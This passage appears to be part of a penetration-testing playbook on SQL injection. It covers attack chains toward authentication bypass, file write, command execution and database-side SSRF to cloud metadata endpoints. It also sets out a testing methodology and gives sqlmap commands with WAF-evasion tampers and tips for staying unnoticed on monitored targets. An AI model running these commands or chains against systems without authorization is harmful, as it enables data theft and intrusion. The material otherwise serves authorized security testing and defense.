- **Recon must have identified the input surface and framework/ORM.** `application_enumeration_api_deep` yields the routes and DSL; `frameworks/django` (or the matching framework file) tells you which ORM APIs are in play, which `preferQueryMode`, which JDBC vendor. Without this, an identifier-position hunt is unguided.
- **Version fingerprint** for CVE-tagged findings — Django `X-Frame-Options` header does not carry the version, but the debug page, `/admin/login/` static asset paths (`/static/admin/css/base.<hash>.css`), and error responses often leak minor version. For pgjdbc, the `preferQueryMode=simple` string in a leaked stack trace is the load-bearing signal.
- **Authentication or a low-privilege session** is usually required to reach the vulnerable route; grant it through `authentication_jwt` (weak signing, token-leak endpoints), IDOR pivots on registration, or `csrf` chained with an XSS from `xss`.

**Downstream — what SQLi grants**

- **Authentication bypass** — a value-position injection into a login WHERE clause or an identifier-position bug like Django `_connector` that collapses AND to OR. Route the session-riding follow-up through `authentication_jwt` for cookie/JWT forgery once the account is compromised.
- **IDOR / data exfil** — direct row read of tables you were not authorized to see. When the SQLi is UPDATE-shaped, an authorization flip (`is_admin=1`) escalates into `broken_function_level_authorization` territory.
- **File write and RCE** — MySQL `INTO OUTFILE` to the webroot, PostgreSQL `COPY TO PROGRAM`, MSSQL `xp_cmdshell`, Oracle `UTL_FILE`. Once the file-write primitive lands, hand the RCE off to `rce` for post-exploitation ordering.
- **SSRF** — DB-side `dblink`, `UTL_HTTP.REQUEST`, PostgreSQL `http` extension, MSSQL `sp_OACreate` all initiate outbound requests from the database node. When the DB has network reach the app does not, chain into `ssrf` for the internal-target catalog and metadata-endpoint reach.
- **Second-order XSS** — a stored SQLi payload that survives escaping at input can be a stored XSS payload for a different endpoint; route to `xss` for the client-side chain.

**Composite chains**

- Recon (`application_enumeration_api_deep`) surfaces a `?filter[]=` DSL → identifier-position hunt confirms `ORDER BY <user_col>` on Django with attacker-controlled sort → `_connector`-style predicate collapse if the target minor is `<5.2.8` → auth bypass → `authentication_jwt` for post-login persistence.
- Blind SQLi via boolean channel → PostgreSQL `dblink` primitive discovered by trial → outbound HTTP to `169.254.169.254` metadata endpoint via `http` extension → route reachability to `ssrf`, credential extraction gate to `cloud/*` (IMDSv2 PUT-token, hop-count, and `Metadata`/`Metadata-Flavor` headers are still enforced from the DB side; reach ≠ credential).
- Stored SQLi via a display-name second-order sink → admin dashboard query fires the payload → UPDATE-shape rewrites a permission row → `broken_function_level_authorization` documents the horizontal-vs-vertical escalation.
- MyBatis `${column}` in a `orderBy` reachable through a GraphQL resolver → identifier-position injection → error-based leak of `sqlite_master`/`information_schema` → target-schema mapping → next-hop UNION for row extraction.

## Testing Methodology

1. **Identify query shape** — SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET, subselects, CTEs
2. **Determine input influence** — Is the user input in a value position (parameterizable) or an identifier position (needs allowlisting)? This determines whether parameterization is the right fix and whether you should be looking for `text()`/`${}`/dict-key sinks.
3. **Fingerprint the engine and version** — engine-specific error string, `SELECT @@version` if UNION-visible, response-header stack signatures (`X-Powered-By`, framework debug pages), and — for CVE-adjacent findings — the framework/driver minor version.
4. **Confirm injection class** — reflective errors, boolean diffs across ≥3 retries, timing that scales with the sleep parameter, or out-of-band callbacks from the target's source IP
5. **Choose the quietest oracle** — prefer error-based or boolean over noisy time-based; prefer OAST over time when the sink allows outbound
6. **Establish extraction channel** — UNION (if visible), error-based, boolean bit extraction, time-based, or OAST
7. **Pivot to metadata** — version, current user, database name — before touching user tables
8. **Target high-value data or actions** — authentication bypass, role changes, filesystem access — within legal scope
9. **Second-order sweep** — store payloads at every input field; traverse admin/logging/reporting endpoints to find the second-endpoint fire

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
2. For an identifier-position bug, show the *emitted SQL* with the crafted identifier appearing verbatim, or the specific patch-signature exception after upgrade. Do not rely on a database syntax error for identifier-position — an unquoted identifier often only errors on a schema mismatch downstream.
3. Extract verifiable metadata (version, current user, database name) using the established channel
4. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
5. Provide reproducible requests that differ only in the injected fragment
6. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)
7. Where a version boundary is the finding, fingerprint the exact release and, if possible, show the fix-version behavior for contrast (the Django `TypeError`/`ValueError` fix-signatures above are the clean form)

## False Positives

- **Generic errors unrelated to SQL parsing** — a Python `AttributeError` or a Java `NullPointerException` returned via a 500 page is not confirmation, even if the URL parameter looked injectable
- **Static response sizes** due to templating, A/B rendering, or cache HITs rather than predicate truth
- **Artificial delays** from network, CPU, rate limiters, or a background job unrelated to injected function calls — confirmation requires the delay to *scale* with the sleep parameter across repeats
- **Parameterized queries with no string concatenation**, verified by code review — the API might be a `text()`/`${}` sink, but the specific call site might parameterize everything
- **WAF block pages** carrying a SQL-shaped rule name (`SQLI_UNION_SELECT_1`) — the WAF matched a pattern; that is not a confirmation of a real sink
- **`sqlmap` "possibly injectable"** without a confirmed channel — sqlmap's heuristic flag is a lead, not a finding; require the channel confirmation before reporting
- **OAST callbacks from the tester's own machine** (a client-side JS fetch fired the callback, not the server) — the source IP has to match the target's egress
- **Identifier-position sinks that turn out to be allowlisted** — the ORM API accepts the identifier but the framework's own validator rejects unknown columns before the SQL builder sees them; verify by reading the allowlist code, not by trying payloads

## Impact

- Direct data exfiltration and privacy/regulatory exposure (PII, PHI, PCI, financial records, session tokens stored server-side)
- Authentication and authorization bypass via manipulated predicates
- Privilege escalation via UPDATE-shape injections that rewrite role/plan/permission columns
- Server-side file access or command execution (platform/privilege dependent)
- Lateral movement into the DB's own network reach — DB-initiated SSRF, cross-DB queries via `dblink`, message-broker access via `NOTIFY`/`LISTEN`
- Persistent supply-chain impact via modified data, scheduled jobs, or stored procedures

## Tooling

- **sqlmap** — the workhorse for value-position injection across every DBMS.
  ```bash
  sqlmap -u 'https://target/api/x?id=1' -p id --batch --level 3 --risk 2 --dbms mysql
  sqlmap -u 'https://target/graphql' --data '{"query":"..."}' --headers 'Content-Type: application/json' \
    -p 'json:query' --batch                       # JSON body injection
  sqlmap -u 'https://target/api/x' --cookie 'session=...; sqli=*' --batch    # inject at * marker
  sqlmap -u 'https://target/api/x?id=1' --technique=U --union-cols=10 --dbs   # UNION-only, skip blind
  sqlmap --tamper=between,charunicodeencode,space2comment -u '...'           # WAF-evasion tampers
  ```
  Traps: sqlmap defaults to a broad payload set that a WAF will fingerprint; on a monitored target, drop to `--level 1 --risk 1` and one `--technique` at a time. `--batch` skips prompts but also skips confirmations you should read — for a high-value target, drop `--batch` and read the interactive suggestions.
- **ghauri** — faster than sqlmap on some targets, better with modern WAFs; use as a second opinion when sqlmap misses.
- **NoSQLMap** — for the NoSQL sibling class; hand off to `nosql_injection` when the target speaks Mongo/Couch/Redis.
- **interactsh-client** — OAST callback for blind/OOB confirmation (see `xss` for the sandbox invocation pattern, identical here).
- **Semgrep / CodeQL** — for identifier-position audits in a code review pass: grep for `text(f`, `${`, `orderByRaw`, `.extra(select=`, `filter(**` where the dict is attacker-influenced. Semgrep rules `python.django.security.injection.raw-query-potential-sqli` and `java.mybatis.security.mybatis-string-sub` cover the common shapes.

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps
2. Normalize responses (length/ETag/digest) to reduce variance when diffing
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`/`text()`/`${}` and every `**kwargs` expansion into an ORM call
6. When you find a dict-expansion sink, probe both `_connector`/`_negated`-shape kwargs *and* identifier-position keys — one target often exposes both families through the same endpoint
7. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
8. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
9. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
10. Validate mitigations with negative tests and code review; parameterize operators/lists correctly, and separately allowlist identifiers — the two require different mitigations
11. Document exact query shapes; defenses must match how the query is constructed, not assumptions
12. For a Django or Rails target, fingerprint the *minor* version — the 2024–2026 identifier-position CVE cadence is dense enough that a target on a lagging minor is exploitable through APIs the maintainers now reject
13. For a JDBC-fronted target, fingerprint `preferQueryMode` before firing pgjdbc CVE-2024-1597 — a default-mode target does not carry the bug
14. For a MyBatis target, grep the mapper XML/annotations for `${` before spraying — `${column}` is the smell, not the URL
15. On any hit, show the emitted SQL for identifier-position and the paired predicate-true/predicate-false for value-position — the reviewer's confidence tracks the evidence shape, not the payload length

## Summary

Modern SQLi succeeds where authorization and query construction drift from assumptions. Two families need two mitigations: bind parameters everywhere for value-position sinks, and allowlist identifiers everywhere they reach the SQL parser from user input. The 2024–2026 CVE cadence in Django, pgjdbc, MyBatis, and Hibernate shows the identifier family is the one most teams still under-audit. Fingerprint the engine and framework, name which family you are in, produce the confirmation signal for the class, and route the chain by filename — `rce` for the file-write follow-up, `ssrf` for DB-initiated outbound, `authentication_jwt` for session persistence after auth bypass. The deep siblings `sql_injection_advanced_deep.md` and `sql_injection_novel_deep.md` extend this file with parser/engine differentials, chained-primitive exploitation, and the 2024–2026 frontier.
